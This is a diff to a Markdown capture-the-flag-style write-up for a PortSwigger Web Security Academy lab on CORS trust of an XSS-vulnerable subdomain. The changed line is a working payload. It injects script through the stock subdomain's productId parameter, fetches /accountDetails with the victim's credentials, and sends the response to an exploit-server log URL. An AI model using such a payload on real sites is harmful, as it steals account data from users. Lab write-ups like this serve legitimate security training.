@@ -119,7 +119,7 @@ In the browser the response from above creates a `<script>` tab and executes js 
 So we try to make the victim make a request to `/accountDetails`, but we do it via subdomain, because we don't want CORS to stand on our way:
 ```bash
 <script>
-    document.location="http://stock.0a1e0074045c8af080abd07700fb004c.web-security-academy.net/?productId=4<script>const req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a1e0074045c8af080abd07700fb004c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a3f00b104618a5b808bcf90016500e8.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    document.location="http://stock.0ae2001b04b2e0dc827365e300bd00b6.web-security-academy.net/?productId=4<script>const req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ae2001b04b2e0dc827365e300bd00b6.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a1000bc0460e08782aa643a01940099.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
 
